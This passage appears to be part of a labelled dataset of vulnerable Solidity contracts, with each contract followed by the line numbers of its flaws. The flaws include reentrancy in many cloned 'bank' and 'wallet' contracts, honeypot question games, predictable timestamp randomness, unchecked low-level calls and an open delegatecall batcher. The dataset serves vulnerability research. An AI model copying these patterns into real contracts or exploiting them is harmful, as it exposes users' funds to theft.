  // Initialization contract assigns address of crowdfund contract.
  function XFM() {
    ownerAddress = msg.sender;
    balances[XferMoneyTeamAddress] += ALLOC_TEAM;
    balances[XferMoneyMarketing] += ALLOC_MARKETING;
    balances[ownerAddress] += ALLOC_CROWDSALE;
    }
  // Transfer amount of tokens from sender account to recipient.
  // Only callable after the crowd fund is completed
  function transfer(address _to, uint _value)
  {
    if (_to == msg.sender) return; // no-op, allow even during crowdsale, in order to work around using grantVestedTokens() while in crowdsale
   // if (!isCrowdfundCompleted()) throw;
    super.transfer(_to, _value);
  }
  // Transfer amount of tokens from a specified address to a recipient.
  // Transfer amount of tokens from sender account to recipient.
  function transferFrom(address _from, address _to, uint _value)
    is_crowdfund_completed
  {
    super.transferFrom(_from, _to, _value);
  }
  //constant function returns the current XFM price.
  function getPriceRate()
      constant
      returns (uint o_rate)
  {
      uint delta = now;
      if (delta < PRESALE_START_WEEK1) return PRICE_PRESALE_START;
      if (delta < PRESALE_START_WEEK2) return PRICE_PRESALE_WEEK1;
      if (delta < PRESALE_START_WEEK3) return PRICE_PRESALE_WEEK2;
      if (delta < CROWDSALE_START) return PRICE_PRESALE_WEEK3;
      return (PRICE_CROWDSALE);
  }
  // calculates amount of XFM we get, given the wei and the rates defined per 1 eth
  function calcAmount(uint _wei, uint _rate)
    constant
    returns (uint)
  {
    return SafeMath.div(SafeMath.mul(_wei, _rate), 1 ether);
  }
  // Returns `amount` in scope as the number of XFM tokens that it will purchase.
  function processPurchase(uint _rate, uint _remaining)
    internal
    returns (uint o_amount)
  {
    o_amount = calcAmount(msg.value, _rate);
    if (o_amount > _remaining) throw;
    if (!multisigAddress.send(msg.value)) throw;
    balances[ownerAddress] = balances[ownerAddress].sub(o_amount);",[64]
"pragma solidity ^0.4.25;
contract X_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function X_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract X_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract X_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function X_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract YUOR_CHANCE
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract Y_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function Y_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract Y_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Y_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.11;
contract ZweiGehenReinEinerKommtRaus {
	address public player1 = address(0);
	event NewPlayer(address token, uint amount);
	event Winner(address token, uint amount);
	function Bet() public payable {
		address player = msg.sender;
		require(msg.value == 1 szabo );
		NewPlayer(player, msg.value);
		if( player1==address(0) ){
			// this is player1
			player1 = player;
		}else{
			// this is player2, finish the game
			// roll the dice
			uint random = now;
			address winner = player1;
			if( random/2*2 == random ){
				// even - player2 wins
				winner = player;
			}
			// clear round
            player1=address(0);
            // the winner takes it all
            uint amount = this.balance;
			winner.transfer(amount);
			Winner(winner, amount);
		}
	}
}",[18]
"pragma solidity ^0.4.24;
contract airDrop{
    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        uint _value = v * 10 ** _decimals;
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],_value);
        }
        return true;
    }
}","[6, 8]"
"pragma solidity ^0.4.24;
contract airPort{
    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}",[7]
"pragma solidity ^0.4.19;
contract anonym_GIFT
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass) && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver && now>giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    bytes32 hashPass;
    bool closed = false;
    address sender;
    address reciver;
    uint giftTime;
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
            giftTime = now;
        }
    }
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            giftTime = date;
        }
    }
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    function() public payable{}
}",[17]
"pragma solidity ^0.4.13;
contract ForeignToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}
contract asdfgh {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;
    uint constant partyTime = 1546505500; // 01/03/2019 @ 8:51am (UTC)
    function() payable {
        hodlers[msg.sender] += msg.value;
        Hodl(msg.sender, msg.value);
    }
    function party() {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        Party(msg.sender, value);
    }
    function withdrawForeignTokens(address _tokenContract) returns (bool) {
        if (msg.sender != 0x6C3e1e834f780ECa69d01C5f3E9C6F5AFb93eb55) { throw; }
        require (block.timestamp > partyTime);
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(0x6C3e1e834f780ECa69d01C5f3E9C6F5AFb93eb55, amount);
    }
}","[12, 16]"
"pragma solidity ^0.4.11;
contract asssderf {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;
    uint constant partyTime = 1546508000; // 01/03/2019 @ 9:25am (UTC)
    function() payable {
        hodlers[msg.sender] += msg.value;
        Hodl(msg.sender, msg.value);
        if (msg.value == 0) {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        Party(msg.sender, value);    
        }
    }
}",[11]
"pragma solidity ^0.4.21;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract batchTransfer {
    using SafeMath for uint256;
    uint public totalEther;
    function batchTransfer() public {
        totalEther = 0;
    }
    function distribute(address[] myAddresses) public payable {
            require(myAddresses.length>0);
            uint256 value = msg.value;
            uint256 length = myAddresses.length;
            uint256 distr = value.div(length);
            if(length==1)
            {
               myAddresses[0].transfer(value);
            }else
            {
                for(uint256 i=0;i<(length.sub(1));i++)
                {
                    myAddresses[i].transfer(distr);
                    value = value.sub(distr);
                }
                myAddresses[myAddresses.length-1].transfer(value);
            }
            totalEther = totalEther.add(msg.value);
    }
}","[56, 61, 64]"
"//       }
//     }
//   }
  function findWinners(uint value) returns (uint)
  {
    numwinners = 0;
    uint lastdiff = maxguess;
    uint i = 0;
    int diff = 0;
    uint guess = 0;
    for (i = 0; i < numguesses; i++) {
      diff = (int)((int)(value)-(int)(guesses[i].guess));
      if(diff<0)
        diff = diff*-1;
      if(lastdiff>(uint)(diff)){
        guess = guesses[i].guess;
        lastdiff = (uint)(diff);
      }
    }
    for (i = 0; i < numguesses; i++) {
      diff = (int)((int)(value)-(int)(guesses[i].guess));
      if(diff<0)
        diff = diff*-1;
      if(lastdiff==uint(diff)){
        winnners[numwinners++].addr = guesses[i].addr;
      }
    }
    return guess;
  }
  function getDeveloperFee() constant returns(uint)
  {
    uint developerfee = this.balance/100;
    return developerfee;
  }
  function getBalance() constant returns(uint)
  {
     return this.balance;
  }
  function getLotteryMoney() constant returns(uint)
  {
    uint developerfee = getDeveloperFee();
    uint prize = (this.balance - developerfee)/(numwinners<1?1:numwinners);
    return prize;
  }
  function getBettingStastics()
    payable
    returns(uint[20])
  {
    require(msg.value == bettingprice*3);
    return statistics;
  }
  function getBettingStatus()
    constant
    returns (uint, uint, uint, uint, uint)
  {
    return ((uint)(state), numguesses, getLotteryMoney(), this.balance, bettingprice);
  }
  function finish()
  {
    state = State.Locked;
    uint lotterynumber = (uint(curhash)+block.timestamp)%(maxguess+1);
    // now that we know the random number was safely generate, let's do something with the random number..
    var guess = findWinners(lotterynumber);
    uint prize = getLotteryMoney();
    uint remain = this.balance - (prize*numwinners);
    for (uint i = 0; i < numwinners; i++) {
      address winner = winnners[i].addr;
      winner.transfer(prize);
      SentPrizeToWinner(winner, prize, guess, _gameindex, lotterynumber, block.timestamp);
    }
    // give delveoper the money left behind
    SentDeveloperFee(remain, this.balance);
    developer.transfer(remain);
    numguesses = 0;
    for (i = 0; i < stasticsarrayitems; i++) {
      statistics[i] = 0;
    }
    _gameindex++;
    state = State.Started;
  }
  function addguess(uint guess)
    inState(State.Started)
    payable
  {
    require(msg.value == bettingprice);
    uint divideby = maxguess/stasticsarrayitems;
    curhash = sha256(block.timestamp, block.coinbase, block.difficulty, curhash);
    if((uint)(numguesses+1)<=arraysize) {
      guesses[numguesses++] = Guess(msg.sender, guess);
      uint statindex = guess / divideby;
      if(statindex>=stasticsarrayitems) statindex = stasticsarrayitems-1;
      statistics[statindex] ++;
      if((uint)(numguesses)>=arraysize){
        finish();
      }
    }
  }
//   function getCurHash() returns (uint)
//   {
//       Winner(this, 0, 0, (uint)(curhash));
//       return (uint)(curhash);
//   }
}
contract bet1000_001eth is bet1000(0.01 ether){
  function bet1000_001eth(){
  }
}","[61, 68]"
"    uint i = 0;
    int diff = 0;
    uint guess = 0;
    for (i = 0; i < numguesses; i++) {
      diff = (int)((int)(value)-(int)(guesses[i].guess));
      if(diff<0)
        diff = diff*-1;
      if(lastdiff>(uint)(diff)){
        guess = guesses[i].guess;
        lastdiff = (uint)(diff);
      }
    }
    for (i = 0; i < numguesses; i++) {
      diff = (int)((int)(value)-(int)(guesses[i].guess));
      if(diff<0)
        diff = diff*-1;
      if(lastdiff==uint(diff)){
        winnners[numwinners++].addr = guesses[i].addr;
      }
    }
    return guess;
  }
  function getDeveloperAddress() constant returns(address)
  {
    return developer;
  }
  function getDeveloperFee() constant returns(uint)
  {
    uint developerfee = this.balance/100;
    return developerfee;
  }
  function getBalance() constant returns(uint)
  {
     return this.balance;
  }
  function getLotteryMoney() constant returns(uint)
  {
    uint developerfee = getDeveloperFee();
    uint prize = (this.balance - developerfee)/(numwinners<1?1:numwinners);
    return prize;
  }
  function getBettingStastics()
    payable
    returns(uint[20])
  {
    require(msg.value == bettingprice*3);
    return statistics;
  }
  function getBettingStatus()
    constant
    returns (uint, uint, uint, uint, uint)
  {
    return ((uint)(state), numguesses, getLotteryMoney(), this.balance, bettingprice);
  }
  function finish()
  {
    state = State.Locked;
    uint lotterynumber = (uint(curhash)+block.timestamp)%(maxguess+1);
    // now that we know the random number was safely generate, let's do something with the random number..
    var guess = findWinners(lotterynumber);
    uint prize = getLotteryMoney();
    uint remain = this.balance - (prize*numwinners);
    for (uint i = 0; i < numwinners; i++) {
      address winner = winnners[i].addr;
      winner.transfer(prize);
      SentPrizeToWinner(winner, prize, guess, _gameindex, lotterynumber, block.timestamp);
    }
    // give delveoper the money left behind
    SentDeveloperFee(remain, this.balance);
    developer.transfer(remain);
    numguesses = 0;
    for (i = 0; i < stasticsarrayitems; i++) {
      statistics[i] = 0;
    }
    _gameindex++;
    state = State.Started;
  }
  function addguess(uint guess)
    inState(State.Started)
    payable
  {
    require(msg.value == bettingprice);
    uint divideby = maxguess/stasticsarrayitems;
    curhash = sha256(block.timestamp, block.coinbase, block.difficulty, curhash);
    if((uint)(numguesses+1)<=arraysize) {
      guesses[numguesses++] = Guess(msg.sender, guess);
      uint statindex = guess / divideby;
      if(statindex>=stasticsarrayitems) statindex = stasticsarrayitems-1;
      statistics[statindex] ++;
      if((uint)(numguesses)>=arraysize){
        finish();
      }
    }
  }
}","[58, 65, 70]"
"pragma solidity ^0.4.25;
contract cD_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function cD_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract c_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function c_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract c_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function c_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract cb_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function cb_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract cd_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function cd_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.7.0;
pragma abicoder v2;
contract Batcher {
  function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
    // If the _res length is less than 68, then the transaction failed silently (without a revert message)
    if (_returnData.length < 68) return ""Transaction reverted silently"";
    assembly {
      // Slice the sighash.
      _returnData := add(_returnData, 0x04)
    }
    return abi.decode(_returnData, (string)); // All that remains is the revert string
  }
  function batch(
    bytes[] memory calls
  ) public payable returns (bytes[] memory results) {
    // Interactions
    results = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
      bytes memory data = calls[i];
      address target;
      bool doDelegate;
      uint88 value;
      assembly {
        let opts := mload(add(data, mload(data)))
        target := shr(96, opts)
        doDelegate := byte(20, opts)
        value := and(opts, 0xffffffffffffffffffffff)
        mstore(data, sub(mload(data), 32))
      }
      (bool success, bytes memory result) = doDelegate ? target.delegatecall(data) : target.call{value: value}(data);
      if (!success) {
        revert(_getRevertMsg(result));
      }
      results[i] = result;
    }
  }
}",[30]
"contract DtktSale is Claimable {
    using SafeMath for uint256;
    struct Sale {
        uint startTime;
        uint endTime;
        uint minPurchase;
        uint weiRaised;
    }
    struct Fees {
        uint fund;
        uint reward;
        uint divisor;
    }
    struct Wallets {
        address fund;
        address fees;
    }
    uint public era;
    Fees public fees;
    Wallets public wallets;
    mapping(uint => Sale) public sales;
    mapping(address => uint) public balances;
    event NewSale(uint era, uint startTime, uint endTime, uint minPurchase);
    event NewFees(uint fund, uint reward, uint divisor);
    event NewWallets(address fund, address fees);
    event Purchase(uint indexed era, address indexed wallet, uint amount);
    event Reward(address indexed affiliate, uint amount);
    event Withdraw(address indexed wallet, uint amount);
		function HoduSale() public {
			//set default
			updateWallets(msg.sender, msg.sender);
			updateFees(4, 1, 100);
		}
    function () public payable {
        if (msg.value > 0) {
            buy();
        } else {
            claim();
        }
    }
    function buy() public payable {
        buyWithReward(wallets.fees);
    }
    function buyWithReward(address affiliate) whenFunding public payable {
        Sale storage sale = sales[era];
        require(msg.value >= sale.minPurchase);
        require(affiliate != msg.sender);
        require(affiliate != address(this));
        uint fee = msg.value.mul(fees.fund).div(fees.divisor);
        uint reward = msg.value.mul(fees.reward).div(fees.divisor);
        uint amount = msg.value.sub(fee).sub(reward);
        balances[wallets.fees] = balances[wallets.fees].add(fee);
        balances[affiliate] = balances[affiliate].add(reward);
        balances[wallets.fund] = balances[wallets.fund].add(amount);
        sale.weiRaised = sale.weiRaised.add(amount);
        Purchase(era, msg.sender, amount);
        Reward(affiliate, reward);
    }
    function claim() public {
        if (msg.sender == wallets.fees || msg.sender == wallets.fund) require(!funding());
        uint payment = balances[msg.sender];
        require(payment > 0);
        balances[msg.sender] = 0;
        msg.sender.transfer(payment);
        Withdraw(msg.sender, payment);
    }
    function funding() public view returns (bool) {
        Sale storage sale = sales[era];
        return now >= sale.startTime && now <= sale.endTime;
    }
    modifier whenFunding() {
        require(funding());
        _;
    }
    modifier whenNotFunding() {
        require(!funding());
        _;
    }
    function updateWallets(address _fund, address _fees) whenNotFunding onlyOwner public {
        wallets = Wallets(_fund, _fees);
        NewWallets(_fund, _fees);
    }
    function updateFees(uint _fund, uint _reward, uint _divisor) whenNotFunding onlyOwner public {
        require(_divisor > _fund && _divisor > _reward);
        fees = Fees(_fund, _reward, _divisor);
        NewFees(_fund, _reward, _divisor);
    }
    function addSale(uint _startTime, uint _endTime, uint _minPurchase) whenNotFunding onlyOwner public {
        require(_startTime >= now && _endTime >= _startTime);
        era = era.add(1);
        sales[era] = Sale(_startTime, _endTime, _minPurchase, 0);
        NewSale(era, _startTime, _endTime, _minPurchase);
    }
}",[69]
"// SPDX-FileCopyrightText: 2021 Lido <info@lido.fi>
pragma solidity ^0.8.4;
interface ICallsScript {
    function execScript(
        bytes memory _script,
        bytes memory,
        address[] memory _blacklist
    ) external returns (bytes memory);
}
/// @author psirex
/// @notice Contains method to execute EVMScripts
/// @dev EVMScripts use format of Aragon's https://github.com/aragon/aragonOS/blob/v4.0.0/contracts/evmscript/executors/CallsScript.sol executor
contract EVMScriptExecutor is Ownable {
    // -------------
    // EVENTS
    // -------------
    event ScriptExecuted(address indexed _caller, bytes _evmScript);
    event EasyTrackChanged(address indexed _previousEasyTrack, address indexed _newEasyTrack);
    // -------------
    // ERRORS
    // -------------
    string private constant ERROR_CALLER_IS_FORBIDDEN = ""CALLER_IS_FORBIDDEN"";
    string private constant ERROR_EASY_TRACK_IS_NOT_CONTRACT = ""EASY_TRACK_IS_NOT_CONTRACT"";
    string private constant ERROR_CALLS_SCRIPT_IS_NOT_CONTRACT = ""CALLS_SCRIPT_IS_NOT_CONTRACT"";
    // ------------
    // CONSTANTS
    // ------------
    // This variable required to use deployed CallsScript.sol contract because
    // CalssScript.sol makes check that caller contract is not petrified (https://hack.aragon.org/docs/common_Petrifiable)
    // Contains value: keccak256(""aragonOS.initializable.initializationBlock"")
    bytes32 internal constant INITIALIZATION_BLOCK_POSITION =
        0xebb05b386a8d34882b8711d156f463690983dc47815980fb82aeeff1aa43579e;
    // ------------
    // VARIABLES
    // ------------
